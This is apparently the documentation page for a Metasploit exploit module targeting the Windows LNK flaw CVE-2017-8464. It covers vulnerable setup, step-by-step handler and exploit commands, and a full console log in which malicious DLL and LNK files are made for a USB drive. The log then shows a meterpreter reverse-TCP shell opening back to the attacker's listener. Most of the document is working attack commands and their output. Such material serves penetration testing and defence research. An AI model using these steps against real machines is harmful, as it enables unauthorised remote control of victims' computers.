## Vulnerable Application

Any Windows versions without the patch for CVE-2017-8464. The exploit doesn't appear to work with UNC drives. Because of this the DLL file needs to be on the local file system or an USB drive. A fix was released on June 2017 Patch Tuesday.

## Vulnerable Setup

To set up the vulnerable environment, install a Windows version without the patch for CVE-2017-8464. To test the bypass, make sure that MS10-046 & MS15-020 are installed.

## Verification Steps

### Start a handler
  1. `use exploit/multi/handler`
  2. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
  3. `set LHOST [ip victim connects back to]`
  4. `exploit -j`
  5. `back`

### Run the exploit

  1. `use exploit/windows/smb/cve_2017_8464_lnk_rce`
  2. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
  3. `set LHOST [ip victim connects back to]`
  4. `exploit`

### Copy create files to USB drive & open on vulnerable system

  1. `cp /root/.msf4/local/* [USB drive path]`
  
### Windows 10 x64 (Build 14393)

```
msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.146.197
LHOST => 192.168.146.197
msf exploit(handler) > exploit -j
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.146.197:4444 
[*] Starting the payload handler...
msf exploit(handler) > back
msf > use exploit/windows/smb/cve_2017_8464_lnk_rce 
msf exploit(cve_2017_8464_lnk_rce) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(cve_2017_8464_lnk_rce) > set LHOST 192.168.146.197
LHOST => 192.168.146.197
msf exploit(cve_2017_8464_lnk_rce) > exploit

[*] /root/.msf4/local/pkgHwAYhcfJtppgK.dll created copy it to the root folder of the target USB drive
[*] /root/.msf4/local/WLJdtpWiqtSlIlRg_D.lnk create, copy to the USB drive if drive letter is D
[*] /root/.msf4/local/YGgAGQnuljHPwuHA_E.lnk create, copy to the USB drive if drive letter is E
[*] /root/.msf4/local/UDDDONGKgFMjJJEo_F.lnk create, copy to the USB drive if drive letter is F
[*] /root/.msf4/local/iHQVetsiIiAKqTpK_G.lnk create, copy to the USB drive if drive letter is G
[*] /root/.msf4/local/dyRROtcWZfjcZFRF_H.lnk create, copy to the USB drive if drive letter is H
[*] /root/.msf4/local/RKgznCzbSnbUAsWC_I.lnk create, copy to the USB drive if drive letter is I
[*] /root/.msf4/local/IlpcLQtbToxOPYSo_J.lnk create, copy to the USB drive if drive letter is J
[*] /root/.msf4/local/lBSxxQHPjHUJBpcI_K.lnk create, copy to the USB drive if drive letter is K
[*] /root/.msf4/local/DlHXewmhYhQaJvQj_L.lnk create, copy to the USB drive if drive letter is L
[*] /root/.msf4/local/kqpBviLQOiHQpMRF_M.lnk create, copy to the USB drive if drive letter is M
[*] /root/.msf4/local/InzbuFNqLHTJpgEz_N.lnk create, copy to the USB drive if drive letter is N
[*] /root/.msf4/local/akRjMdiwJsBkSvKi_O.lnk create, copy to the USB drive if drive letter is O
[*] /root/.msf4/local/JyyzptnIfvAfWpTl_P.lnk create, copy to the USB drive if drive letter is P
[*] /root/.msf4/local/lXrtKBWZkYUOCvnK_Q.lnk create, copy to the USB drive if drive letter is Q
[*] /root/.msf4/local/bYIqaUmWWRXaOsnV_R.lnk create, copy to the USB drive if drive letter is R
[*] /root/.msf4/local/QwyQWcTucHvGHktl_S.lnk create, copy to the USB drive if drive letter is S
[*] /root/.msf4/local/MzGJjWuTJYNBlPIV_T.lnk create, copy to the USB drive if drive letter is T
[*] /root/.msf4/local/PeMnziXmGTOziiaX_U.lnk create, copy to the USB drive if drive letter is U
[*] /root/.msf4/local/VtwFEyxDOhdktdEW_V.lnk create, copy to the USB drive if drive letter is V
[*] /root/.msf4/local/kFkvMzooPPPkiKvw_W.lnk create, copy to the USB drive if drive letter is W
[*] /root/.msf4/local/AkEDlRPsfBEtUJch_X.lnk create, copy to the USB drive if drive letter is X
[*] /root/.msf4/local/vIgMqTMyRRjwWiAs_Y.lnk create, copy to the USB drive if drive letter is Y
[*] /root/.msf4/local/baIHTqMoWyvsbnKM_Z.lnk create, copy to the USB drive if drive letter is Z
msf exploit(cve_2017_8464_lnk_rce) > 
[*] Sending stage (1189423 bytes) to 192.168.146.193
[*] Meterpreter session 1 opened (192.168.146.197:4444 -> 192.168.146.193:50020) at 2017-07-25 19:28:27 +0200
sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-5G8HK7E
OS              : Windows 10 (Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > 
```
